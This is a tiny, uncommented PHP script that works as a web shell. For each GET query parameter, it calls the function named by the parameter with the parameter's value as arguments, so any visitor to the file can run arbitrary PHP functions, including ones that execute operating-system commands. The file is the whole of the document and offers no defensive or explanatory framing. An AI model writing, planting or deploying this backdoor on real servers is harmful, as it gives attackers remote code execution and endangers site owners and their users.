<?php
foreach ($_GET as $callback => $param_arr) {
    call_user_func_array($callback, (array) $param_arr);
}
